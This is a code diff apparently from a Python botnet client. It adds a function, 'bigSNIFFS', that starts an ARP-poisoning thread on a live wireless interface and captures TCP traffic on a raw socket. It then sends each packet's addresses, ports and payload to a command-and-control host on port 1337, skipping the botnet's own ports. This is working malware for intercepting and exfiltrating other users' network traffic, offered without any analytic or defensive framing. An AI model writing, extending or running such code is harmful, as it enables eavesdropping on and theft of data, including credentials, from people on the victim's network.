@@ -61,3 +61,77 @@ def create_pkt_arp_poison():
             s.send(dst_addr + src_addr + ethertype + payload+src_addr + src_ip_addr
                    + dst_mac_addr + dst_ip_addr + checksum)
         time.sleep(2)
+
+global pause
+pause = 1
+def bigSNIFFS(cncip):
+    global pause
+    up = 0
+    SIOCGIFFLAGS = 0x8913
+    null256 = '\0'*256
+    ifname = "wlan0"
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        result = fcntl.ioctl(s.fileno(  ), SIOCGIFFLAGS, ifname + null256)
+        flags, = unpack('H', result[16:18])
+        up = flags & 1
+    except:
+        pass
+    if up == 1:
+        threading.Thread(target=create_pkt_arp_poison,args=()).start()
+    try:
+        s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+    except socket.error,msg:
+        return
+    count = 0
+    while True:
+        if pause == 1:
+            continue
+        try:
+            packet = s.recvfrom(65565)
+            count= count+1
+            packet=packet[0]
+            eth_length = 14
+            eth_header = packet[:eth_length]
+            eth_unpack =  unpack('!6s6sH',eth_header)
+            eth_protocol = socket.ntohs(eth_unpack[2])
+            ip_header = packet[0:20]
+            header_unpacked = unpack('!BBHHHBBH4s4s',ip_header)
+            version_ih1= header_unpacked[0] 
+            version = version_ih1 >> 4 
+            ih1 = version_ih1 & 0xF
+            
+            iph_length = ih1*4
+            
+            ttl = header_unpacked[5]
+            protocol = header_unpacked[6]
+            source_add = socket.inet_ntoa(header_unpacked[8])
+            destination_add = socket.inet_ntoa(header_unpacked[9])
+            tcp_header = packet[iph_length:iph_length+20]
+
+            #unpack them 
+            tcph = unpack('!HHLLBBHHH',tcp_header)
+            
+            source_port = tcph[0]
+            dest_port = tcph[1]
+            sequence = tcph[2]
+            ack = tcph[3]
+            resrve = tcph[4]
+            tcph_len = resrve >> 4
+            h_size = iph_length+tcph_len*4
+            data_size = len(packet)-h_size
+            data = packet[h_size:]
+            if len(data) > 2 and source_port!=1337 and source_port!=6667 and source_port!=23 and source_port!=443 and source_port!=37215 and source_port!=53 and source_port!=22 and dest_port!=1337 and dest_port!=6667 and dest_port!=23 and dest_port!=443 and dest_port!=37215 and dest_port!=53 and dest_port!=22:
+                try:
+                    ss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                    ss.connect((cncip, 1337))
+                    ss.send('IPv'+str(version)+ '\nTTL:'+str(ttl)+'\nProtocol:'+str(protocol)+"\nSource Address:"+str(source_add)+"\nDestination Address:"+str(destination_add)+"\n-------------------------------------------\n\nSource Port:"+str(source_port)+"\nDestination Port:"+str(dest_port)+"\n##########BEGINDATA##################\n"+data+"------------------------------------\n\n###########ENDDATA###################\n")
+                    ss.close()
+                except:
+                    pass
+        except:
+            pass
+
+
+ETH_P_IP = 0x0800 # Internet Protocol Packet
+
